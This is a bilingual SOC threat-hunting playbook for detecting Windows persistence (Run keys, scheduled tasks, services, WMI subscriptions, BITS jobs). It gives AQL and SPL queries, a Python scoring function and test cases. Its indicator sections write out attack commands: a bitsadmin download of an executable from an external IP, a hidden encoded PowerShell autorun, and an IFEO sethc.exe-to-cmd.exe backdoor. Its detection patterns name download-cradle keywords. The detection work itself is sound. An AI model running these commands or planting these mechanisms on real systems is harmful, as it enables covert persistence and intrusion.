# HUNT-004 — Persistence Detection
<!-- T1547.001 · T1053.005 · T1543.003 · T1546.003 · T1197 -->

---

## Überblick

| Feld              | Inhalt                                                                                         |
|-------------------|------------------------------------------------------------------------------------------------|
| Hunt-ID           | HUNT-004                                                                                       |
| MITRE ATT&CK      | T1547.001 (Registry Run), T1053.005 (Sched. Tasks), T1543.003 (Services), T1546.003 (WMI Sub), T1197 (BITS) |
| Taktik            | Persistence, Privilege Escalation                                                              |
| Daten-Quellen     | Sysmon (1, 11, 12, 13), Windows Security (4698, 4699, 4700, 4701, 7045), System (7045)        |
| Konfidenz-Basis   | Registry path + value content + process lineage + temporal correlation                        |
| Autor             | SOC Engineering                                                                                |
| Letzte Revision   | 2026-06-03                                                                                     |

---

## Erkennungslogik / Detection Logic

### 1. Registry Run/RunOnce Key Writes — Sysmon Event 13

#### QRadar AQL
```aql
-- Registry write to autorun locations (Sysmon 13)
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "Image" AS writing_process,
    "TargetObject" AS reg_key,
    "Details" AS reg_value,
    "ProcessId"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '13'
    AND (
        "TargetObject" LIKE '%\SOFTWARE\Microsoft\Windows\CurrentVersion\Run%'
        OR "TargetObject" LIKE '%\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce%'
        OR "TargetObject" LIKE '%\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon%'
        OR "TargetObject" LIKE '%\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute%'
        OR "TargetObject" LIKE '%\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options%'
        OR "TargetObject" LIKE '%\SOFTWARE\Classes\ms-settings\shell\open\command%'
        OR "TargetObject" LIKE '%\Environment\UserInitMprLogonScript%'
    )
    AND LOWER("Image") NOT IN (
        'c:\windows\system32\msiexec.exe',
        'c:\windows\system32\services.exe',
        'c:\program files\windows defender\msmpeng.exe'
    )
    AND "Image" NOT LIKE '%\AppData\Local\Microsoft\OneDrive\%'
    AND "Image" NOT LIKE '%\Program Files\%\Update.exe'
LAST 24 HOURS
ORDER BY event_time DESC
```

#### Splunk SPL
```spl
index=sysmon EventCode=13
| where match(TargetObject, "(?i)(\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon|\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\BootExecute|\\\\Image File Execution Options|\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command|\\\\Environment\\\\UserInitMprLogonScript)")
| where NOT match(lower(Image), "(msiexec\.exe|services\.exe|msmpeng\.exe|onedrivesetup\.exe|windowsupdate\.exe)")
| where NOT match(Image, "(?i)\\\\Program Files\\\\(Common Files|Windows Defender)")
| eval suspicious_value=case(
    match(lower(Details), "(powershell|cmd|wscript|cscript|mshta|rundll32|regsvr32)"), "SHELL_EXEC",
    match(lower(Details), "(%temp%|%appdata%|%userprofile%)"), "TEMP_PATH",
    match(lower(Details), "http(s)?://"), "NETWORK_PATH",
    match(lower(Details), "\\.(vbs|js|hta|bat|ps1|jse|wsf)$"), "SCRIPT_EXT",
    1==1, "BINARY"
  )
| eval confidence=case(
    suspicious_value="NETWORK_PATH", 98,
    suspicious_value="SHELL_EXEC" AND match(lower(Details), "(-enc|-e |base64|iex|invoke-expression)"), 96,
    suspicious_value="SHELL_EXEC", 85,
    suspicious_value="SCRIPT_EXT" AND match(TargetObject, "RunOnce"), 80,
    suspicious_value="TEMP_PATH", 78,
    1==1, 60
  )
| table _time, Computer, user, Image, TargetObject, Details, suspicious_value, confidence
| sort -confidence
```

---

### 2. Scheduled Task Creation — Event 4698

#### QRadar AQL
```aql
-- Scheduled task creation (4698) with suspicious content
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    sourceip,
    username,
    "Task Name",
    "Task Content"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) = 'Microsoft Windows Security Event Log'
    AND "Event ID" = '4698'
    AND (
        -- Tasks executing from suspicious paths
        "Task Content" LIKE '%\AppData\%'
        OR "Task Content" LIKE '%\Temp\%'
        OR "Task Content" LIKE '%\Users\Public\%'
        OR "Task Content" LIKE '%http%'
        -- Tasks using scripting engines
        OR "Task Content" ILIKE '%powershell%'
        OR "Task Content" ILIKE '%wscript%'
        OR "Task Content" ILIKE '%mshta%'
        OR "Task Content" ILIKE '%regsvr32%'
        OR "Task Content" ILIKE '%rundll32%'
    )
    AND username NOT LIKE '%$'
    AND "Task Name" NOT IN (SELECT taskname FROM reference set approved_scheduled_tasks)
LAST 24 HOURS
ORDER BY event_time DESC

-- Hidden/obfuscated task names (GUID-like or unusual chars)
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    username,
    "Task Name"
FROM events
WHERE
    "Event ID" = '4698'
    AND (
        "Task Name" RLIKE '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
        OR "Task Name" RLIKE '^[A-Z]{8,}$'
        OR LENGTH("Task Name") <= 3
    )
LAST 24 HOURS
```

#### Splunk SPL
```spl
index=wineventlog EventCode=4698
| spath input=TaskContent output=exec_action path=Task.Actions.Exec.Command
| spath input=TaskContent output=exec_args path=Task.Actions.Exec.Arguments
| spath input=TaskContent output=trigger_type path=Task.Triggers.CalendarTrigger.ScheduleByMinutes
| eval full_cmd=exec_action." ".exec_args
| eval suspicious_exec=case(
    match(lower(exec_action), "(powershell|cmd\.exe|wscript|cscript|mshta|regsvr32|rundll32)"), 1,
    match(lower(exec_action), "(%temp%|%appdata%|\\\\public\\\\|\\\\users\\\\public)"), 1,
    match(lower(full_cmd), "(http|ftp|\\\\\\\\[0-9])"), 1,
    match(lower(full_cmd), "(-enc|-e |iex|invoke-expression|downloadstring|webclient)"), 1,
    1==1, 0
  )
| eval hidden_name=if(
    match(TaskName, "[a-f0-9]{8}-[a-f0-9]{4}") OR len(TaskName) <= 3 OR match(TaskName, "^[A-Z]{8,}$"), 1, 0
  )
| lookup approved_tasks TaskName AS TaskName OUTPUT is_approved
| where NOT is_approved=1 AND (suspicious_exec=1 OR hidden_name=1)
| eval confidence=case(
    match(lower(full_cmd), "(-enc|-e |iex|downloadstring|webclient)"), 95,
    match(lower(full_cmd), "http") AND suspicious_exec=1, 93,
    hidden_name=1 AND suspicious_exec=1, 90,
    suspicious_exec=1, 78,
    hidden_name=1, 65,
    1==1, 50
  )
| table _time, Computer, SubjectUserName, TaskName, exec_action, exec_args, confidence
| sort -confidence
```

---

### 3. Malicious Service Installation — Event 7045

#### QRadar AQL
```aql
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "Service Name",
    "Service File Name" AS binary_path,
    "Service Type",
    "Service Start Type",
    "Service Account"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) = 'Microsoft Windows Security Event Log'
    AND "Event ID" = '7045'
    AND (
        -- Binary in suspicious locations
        "Service File Name" LIKE '%\Temp\%'
        OR "Service File Name" LIKE '%\AppData\%'
        OR "Service File Name" LIKE '%\Users\Public\%'
        OR "Service File Name" LIKE '%\ProgramData\%'
        -- cmd.exe or powershell as service binary
        OR LOWER("Service File Name") LIKE '%cmd.exe%'
        OR LOWER("Service File Name") LIKE '%powershell.exe%'
        OR LOWER("Service File Name") LIKE '%rundll32.exe%'
        -- Network paths
        OR "Service File Name" LIKE '\\\\%'
    )
    AND "Service Name" NOT IN (SELECT svcname FROM reference set approved_services)
LAST 24 HOURS
```

#### Splunk SPL
```spl
index=wineventlog EventCode=7045
| eval binary_path=lower(ServiceFileName)
| eval suspicious_path=case(
    match(binary_path, "(\\\\temp\\\\|\\\\appdata\\\\|\\\\public\\\\|\\\\programdata\\\\[^\\\\]+\\\\[^\\\\]+\\\\)"), "SUSPICIOUS_DIR",
    match(binary_path, "(cmd\.exe|powershell\.exe|wscript\.exe|rundll32\.exe)"), "SHELL_AS_SERVICE",
    match(binary_path, "^\\\\\\\\"), "NETWORK_PATH",
    match(binary_path, "\.exe.*-enc "), "OBFUSCATED_ARGS",
    1==1, "STANDARD"
  )
| lookup approved_services ServiceName AS ServiceName OUTPUT is_approved
| where NOT is_approved=1 AND suspicious_path != "STANDARD"
| eval confidence=case(
    suspicious_path="SHELL_AS_SERVICE", 90,
    suspicious_path="NETWORK_PATH", 88,
    suspicious_path="OBFUSCATED_ARGS", 85,
    suspicious_path="SUSPICIOUS_DIR", 75,
    1==1, 50
  )
| table _time, Computer, AccountName, ServiceName, ServiceFileName, ServiceType, StartType, suspicious_path, confidence
| sort -confidence
```

---

### 4. WMI Permanent Event Subscriptions — T1546.003

#### QRadar AQL
```aql
-- WMI subscription: Sysmon 19 (filter), 20 (consumer), 21 (binding)
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "Event ID",
    "Name" AS subscription_name,
    "Query" AS wmi_query,
    "Destination" AS consumer_destination,
    "Consumer" AS consumer_name,
    "Filter" AS filter_name
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" IN ('19', '20', '21')
LAST 24 HOURS
ORDER BY event_time DESC

-- Correlate: all three events (filter + consumer + binding) from same host
SELECT
    host,
    COUNT(DISTINCT "Event ID") AS subscription_event_types,
    ARRAY_AGG(DISTINCT "Name") AS names
FROM (
    SELECT destinationip AS host, "Event ID", "Name"
    FROM events
    WHERE "Event ID" IN ('19', '20', '21')
    LAST 24 HOURS
)
GROUP BY host
HAVING subscription_event_types = 3
```

#### Splunk SPL
```spl
-- Detect WMI permanent subscriptions (Sysmon 19/20/21 triad)
index=sysmon EventCode IN (19, 20, 21)
| eval sub_type=case(EventCode=19, "FilterCreated", EventCode=20, "ConsumerCreated", EventCode=21, "FilterConsumerBound")
| stats values(sub_type) AS sub_types, values(Name) AS names, values(Destination) AS destinations,
         values(Query) AS queries, count AS evt_count, min(_time) AS first_seen
  BY Computer
| eval has_all_three=if(mvcount(mvfilter(match(sub_types,"FilterCreated"))) > 0
    AND mvcount(mvfilter(match(sub_types,"ConsumerCreated"))) > 0
    AND mvcount(mvfilter(match(sub_types,"FilterConsumerBound"))) > 0, 1, 0)
| eval suspicious_consumer=if(
    mvcount(mvfilter(match(lower(destinations), "(powershell|cmd|wscript|mshta|regsvr32)"))) > 0, 1, 0
  )
| eval confidence=case(
    has_all_three=1 AND suspicious_consumer=1, 97,
    has_all_three=1, 85,
    suspicious_consumer=1, 78,
    1==1, 55
  )
| where confidence >= 55
| table Computer, sub_types, names, destinations, queries, confidence, first_seen
| sort -confidence
```

---

### 5. BITS Job Creation — T1197

#### QRadar AQL
```aql
-- BITS job creation via bitsadmin or PowerShell BITS module
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "Image" AS creating_process,
    "CommandLine",
    "ParentImage"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND (
        LOWER("CommandLine") LIKE '%bitsadmin%/transfer%'
        OR LOWER("CommandLine") LIKE '%bitsadmin%/addfile%'
        OR LOWER("CommandLine") LIKE '%bitsadmin%/create%'
        OR LOWER("CommandLine") LIKE '%Start-BitsTransfer%'
        OR LOWER("CommandLine") LIKE '%IBackgroundCopyManager%'
    )
    AND NOT (
        LOWER("ParentImage") LIKE '%\svchost.exe'
        AND "CommandLine" LIKE '%WindowsUpdate%'
    )
LAST 24 HOURS
```

#### Splunk SPL
```spl
index=sysmon EventCode=1
| where match(lower(CommandLine), "(bitsadmin.*(\/transfer|\/addfile|\/create|\/resume)|start-bitstransfer|ibackgroundcopymanager)")
| where NOT (match(lower(ParentImage), "svchost\.exe") AND match(lower(CommandLine), "windowsupdate"))
| eval download_url=replace(CommandLine, ".*?(https?://[^\s]+).*", "\1")
| eval destination_file=replace(CommandLine, ".*(C:\\\\[^\s]+\.(exe|dll|ps1|vbs|bat|hta))\s*.*", "\1")
| eval confidence=case(
    match(lower(destination_file), "(\\.exe|\\.dll)") AND NOT match(lower(download_url), "microsoft\\.com|windowsupdate"), 92,
    match(lower(destination_file), "(\\.ps1|\\.vbs|\\.bat|\\.hta)"), 88,
    match(lower(download_url), "^https?://[0-9]{1,3}\\.[0-9]{1,3}"), 90,
    1==1, 70
  )
| table _time, Computer, user, CommandLine, download_url, destination_file, confidence
| sort -confidence
```

---

## True Positives (Echte Angriffsindikatoren)

### TP-001 — Registry Run Key via PowerShell Cradle
- **Indikatoren:** Sysmon 13: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateSvc` = `"powershell.exe -nop -w hidden -e <base64>"`; writing process: `powershell.exe` parent `explorer.exe`
- **Confidence:** 96
- **MITRE:** T1547.001

### TP-002 — Scheduled Task with -EncodedCommand
- **Indikatoren:** Event 4698: TaskName `\Microsoft\Windows\Multimedia\Update`, Command: `powershell.exe -e <base64>`, TriggerType: every 5 min; creator: standard user account (not SYSTEM/admin)
- **Confidence:** 94
- **MITRE:** T1053.005

### TP-003 — Service Installing Meterpreter DLL
- **Indikatoren:** Event 7045: ServiceName `WinHttpSvc32`, ServiceFileName: `C:\ProgramData\Intel\update.dll, -k netsvcs`; binary hash matches known Meterpreter stage
- **Confidence:** 99
- **MITRE:** T1543.003

### TP-004 — WMI Subscription (ActiveScriptEventConsumer)
- **Indikatoren:** Sysmon 19+20+21 triad; Consumer type `ActiveScriptEventConsumer`, script contains `CreateObject("WScript.Shell").Run` downloading a payload; Filter: `__InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'`
- **Confidence:** 97
- **MITRE:** T1546.003

### TP-005 — BITS Persistence to Attacker Infrastructure
- **Indikatoren:** `bitsadmin /transfer UpdateJob /download /priority FOREGROUND http://185.220.101.47/update.exe C:\Users\Public\svchost32.exe`; Job re-created on logon via registry `HKCU\Run`; external IP
- **Confidence:** 98
- **MITRE:** T1197

---

## False Positives (Bekannte FP-Quellen)

| FP-ID  | Quelle                        | Erkennungsmerkmal                                           | Whitelist-Logik                                                                 |
|--------|-------------------------------|-------------------------------------------------------------|---------------------------------------------------------------------------------|
| FP-001 | Software Installers (MSI)     | Registry Run key writes by msiexec.exe                      | `Image=msiexec.exe` AND `ParentImage=services.exe` AND during business hours   |
| FP-002 | Windows Update                | BITS transfers to windowsupdate.microsoft.com               | URL matches `*.microsoft.com` OR `*.windows.com` AND SHA256 in known-good list |
| FP-003 | AV/EDR Agent Install          | Service registration (7045) by trusted installer            | `ServiceFileName LIKE '%Program Files%'` AND signed PE by trusted vendor       |
| FP-004 | Microsoft Teams/OneDrive      | Registry Run key persistence                                | `Image LIKE '%Teams.exe%'` OR `Image LIKE '%OneDrive%'` AND signed             |
| FP-005 | SCCM Software Deployment      | Scheduled task creation by SYSTEM from trusted binary path  | Creator=SYSTEM AND `Image LIKE '%\ccm\%'` AND TaskName matches SCCM pattern    |
| FP-006 | Startup scripts (GPO)         | Registry `UserInitMprLogonScript` set via GPO               | Change correlates with GPO deployment event on DC                               |
| FP-007 | WMI Management Tools          | Legitimate WMI subscriptions (Endpoint management)          | Consumer references signed binary in `%ProgramFiles%` with valid signature     |

---

## Varianten / Evasion-Techniken

### VAR-001 — Registry Run via COM Object (Living off the Land)
- Write Run key using `reg.exe` or `regini.exe` instead of PowerShell to avoid cmdline detection
- **Detection:** Sysmon 13 fires regardless of writing process; focus on TargetObject path

### VAR-002 — Scheduled Task via COM (No schtasks.exe)
- `$sched = New-Object -ComObject Schedule.Service` — bypasses `schtasks.exe` process creation
- **Detection:** Event 4698 fires regardless; Sysmon 1 missing `schtasks.exe` — rely on Security log

### VAR-003 — WMI CommandLineEventConsumer (vs. ActiveScript)
- Uses `CommandLineEventConsumer` instead of `ActiveScriptEventConsumer` — executes binary directly
- **Detection:** Sysmon 20 `Destination` field contains binary path; same detection logic

### VAR-004 — Service via SCM API (no sc.exe)
- Python/C2 frameworks call SCM API directly — no `sc.exe` process; still generates 7045
- **Detection:** 7045 always fires for service installs; check ServiceFileName content

### VAR-005 — BITS Job with Notification CmdLine (Persistence Vector)
- `bitsadmin /SetNotifyCmdLine <job> <cmd>` — runs command when job completes (on system start)
- **Detection:** Sysmon 1: `bitsadmin.exe` with `/SetNotifyCmdLine`; Event 4688 equivalent

### VAR-006 — Image File Execution Options Debugger (Accessibility Backdoor)
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger = cmd.exe`
- **Detection:** Sysmon 13 on IFEO path; child process monitor for accessibility EXEs spawning shells

### VAR-007 — Winlogon Helper DLL Hijack
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` or `Userinit` modification
- **Detection:** Sysmon 13 on Winlogon registry keys; value change from default (`explorer.exe`)

---

## Confidence Scoring

```python
from dataclasses import dataclass, field
from typing import List, Optional
import re
import base64

SUSPICIOUS_REG_PATHS = [
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    r"SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute",
    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
    r"SOFTWARE\Classes\ms-settings\shell\open\command",
    r"Environment\UserInitMprLogonScript",
]

SHELL_EXECUTABLES = {
    "powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe",
    "mshta.exe", "regsvr32.exe", "rundll32.exe", "certutil.exe"
}

SUSPICIOUS_PATHS = re.compile(
    r"(?i)(\\temp\\|\\appdata\\|\\users\\public\\|\\programdata\\[^\\]+\\[^\\]+\\)",
    re.IGNORECASE
)

ENCODED_PATTERNS = re.compile(
    r"(?i)(-enc\s|-e\s+[A-Za-z0-9+/=]{20,}|invoke-expression|iex\s*\(|downloadstring|webclient)",
    re.IGNORECASE
)

def _decode_b64_commandline(cmdline: str) -> Optional[str]:
    """Attempt to base64-decode a PowerShell encoded command."""
    match = re.search(r"-e(?:nc)?\s+([A-Za-z0-9+/=]{20,})", cmdline, re.IGNORECASE)
    if match:
        try:
            return base64.b64decode(match.group(1)).decode("utf-16-le", errors="replace")
        except Exception:
            return None
    return None

@dataclass
class PersistenceEvent:
    host: str
    username: str
    event_type: str              # "registry", "task", "service", "wmi", "bits"
    # Registry fields
    reg_path: str = ""
    reg_value: str = ""
    writing_process: str = ""
    parent_process: str = ""
    # Task/Service fields
    task_name: str = ""
    task_command: str = ""
    service_name: str = ""
    service_binary: str = ""
    # WMI fields
    wmi_consumer_type: str = ""  # "ActiveScript" or "CommandLine"
    wmi_consumer_content: str = ""
    wmi_filter_query: str = ""
    has_all_wmi_events: bool = False
    # BITS fields
    bits_url: str = ""
    bits_dest_path: str = ""
    # Context
    is_approved: bool = False
    is_system_account: bool = False
    is_signed_binary: bool = False
    is_software_install_context: bool = False

def score_persistence(evt: PersistenceEvent) -> dict:
    if evt.is_approved:
        return {"confidence": 5, "verdict": "WHITELISTED", "reasons": ["Approved/known-good"], "techniques": []}

    score = 0
    reasons = []
    techniques = []

    if evt.event_type == "registry":
        matched_path = any(p.lower() in evt.reg_path.lower() for p in SUSPICIOUS_REG_PATHS)
        if not matched_path:
            return {"confidence": 10, "verdict": "INFORMATIONAL", "reasons": ["Non-autorun path"], "techniques": []}

        score += 30
        reasons.append(f"Autorun registry path: {evt.reg_path}")
        techniques.append("T1547.001")

        # Value content analysis
        if ENCODED_PATTERNS.search(evt.reg_value):
            score += 40
            reasons.append("Encoded/obfuscated command in registry value")
            decoded = _decode_b64_commandline(evt.reg_value)
            if decoded:
                reasons.append(f"Decoded payload starts with: {decoded[:80]}")

        elif any(s in evt.reg_value.lower() for s in SHELL_EXECUTABLES):
            score += 25
            reasons.append("Shell executable referenced in registry value")

        elif re.search(r"https?://", evt.reg_value, re.IGNORECASE):
            score += 35
            reasons.append("Network URL in registry autorun value")

        if SUSPICIOUS_PATHS.search(evt.reg_value):
            score += 15
            reasons.append("Suspicious path (Temp/AppData) in registry value")

        if evt.writing_process.lower().endswith("msiexec.exe") and evt.is_software_install_context:
            score = max(0, score - 35)
            reasons.append("MSI installer context — reducing score")

    elif evt.event_type == "task":
        techniques.append("T1053.005")
        score += 20
        reasons.append("Scheduled task creation")

        if ENCODED_PATTERNS.search(evt.task_command):
            score += 45
            reasons.append("Encoded/obfuscated PowerShell in task command")

        if re.search(r"https?://|ftp://|\\\\[0-9]", evt.task_command, re.IGNORECASE):
            score += 40
            reasons.append("Network path in task command")

        if SUSPICIOUS_PATHS.search(evt.task_command):
            score += 20
            reasons.append("Suspicious execution path in task")

        if any(s in evt.task_command.lower() for s in SHELL_EXECUTABLES):
            score += 15
            reasons.append("Shell binary in task command")

        if re.match(r"[a-f0-9]{8}-[a-f0-9]{4}", evt.task_name, re.IGNORECASE) or len(evt.task_name) <= 3:
            score += 20
            reasons.append("GUID-like or suspiciously short task name")

        if evt.is_system_account and evt.is_signed_binary:
            score = max(0, score - 30)
            reasons.append("SYSTEM + signed binary — likely legitimate")

    elif evt.event_type == "service":
        techniques.append("T1543.003")
        score += 15
        reasons.append("Service installation event")

        if SUSPICIOUS_PATHS.search(evt.service_binary):
            score += 40
            reasons.append(f"Service binary in suspicious path: {evt.service_binary}")

        if any(s in evt.service_binary.lower() for s in {"cmd.exe", "powershell.exe", "wscript.exe", "rundll32.exe"}):
            score += 45
            reasons.append("Shell/interpreter as service binary")

        if evt.service_binary.startswith("\\\\"):
            score += 40
            reasons.append("Service binary on network path")

        if evt.is_signed_binary and not SUSPICIOUS_PATHS.search(evt.service_binary):
            score = max(0, score - 25)
            reasons.append("Signed binary in standard path — less suspicious")

    elif evt.event_type == "wmi":
        techniques.append("T1546.003")
        if evt.has_all_wmi_events:
            score += 50
            reasons.append("Complete WMI subscription triad (filter + consumer + binding)")
        else:
            score += 25
            reasons.append("Partial WMI subscription events")

        if evt.wmi_consumer_type == "ActiveScript" and any(
            s in evt.wmi_consumer_content.lower()
            for s in ["createobject", "wscript.shell", "run(", "exec("]
        ):
            score += 35
            reasons.append("ActiveScriptEventConsumer with shell execution")

        if evt.wmi_consumer_type == "CommandLine" and SUSPICIOUS_PATHS.search(evt.wmi_consumer_content):
            score += 25
            reasons.append("CommandLineEventConsumer with suspicious path")

    elif evt.event_type == "bits":
        techniques.append("T1197")
        score += 20
        reasons.append("BITS job creation")

        if re.match(r"https?://[0-9]{1,3}\.[0-9]{1,3}", evt.bits_url):
            score += 40
            reasons.append("BITS download from raw IP address")

        elif evt.bits_url and not re.search(r"microsoft\.com|windows\.com|windowsupdate", evt.bits_url, re.IGNORECASE):
            score += 25
            reasons.append(f"BITS download from non-Microsoft host: {evt.bits_url}")

        if evt.bits_dest_path and re.search(r"\.(exe|dll|ps1|vbs|bat|hta)$", evt.bits_dest_path, re.IGNORECASE):
            score += 20
            reasons.append(f"BITS downloading executable/script: {evt.bits_dest_path}")

    confidence = min(100, score)
    verdict = (
        "HIGH" if confidence >= 80
        else "MEDIUM" if confidence >= 55
        else "LOW" if confidence >= 30
        else "INFORMATIONAL"
    )

    return {
        "confidence": confidence,
        "verdict": verdict,
        "reasons": reasons,
        "techniques": list(set(techniques))
    }
```

---

## Testfälle / Test Cases

| TC-ID  | Typ           | Beschreibung                                                                          | Expected Confidence | Expected Verdict |
|--------|---------------|---------------------------------------------------------------------------------------|---------------------|------------------|
| TC-001 | True Positive | Registry Run key with `-enc` base64 PowerShell payload                               | 85–100              | HIGH             |
| TC-002 | True Positive | Scheduled task with `invoke-expression` + network URL                                | 90–100              | HIGH             |
| TC-003 | True Positive | Service binary `cmd.exe /c powershell.exe -e <b64>` in C:\ProgramData\Temp          | 90–100              | HIGH             |
| TC-004 | True Positive | WMI triad (events 19+20+21) with ActiveScriptEventConsumer using WScript.Shell       | 90–100              | HIGH             |
| TC-005 | True Positive | BITS download from raw IP `185.x.x.x` to `C:\Users\Public\update.exe`              | 80–95               | HIGH             |
| TC-006 | False Positive | msiexec.exe writing Run key during software install                                  | ≤15                 | INFORMATIONAL    |
| TC-007 | False Positive | BITS transfer to `*.microsoft.com` / Windows Update                                 | ≤20                 | INFORMATIONAL    |
| TC-008 | False Positive | Service install (SYSTEM, signed binary, `%ProgramFiles%` path)                      | ≤25                 | LOW/INFORMATIONAL|
| TC-009 | Edge Case     | GUID task name but SYSTEM creator + signed binary in System32                       | 40–65               | LOW/MEDIUM       |
| TC-010 | Edge Case     | Registry Run key in `HKCU\Run` written by OneDrive.exe (signed)                     | ≤20                 | INFORMATIONAL    |
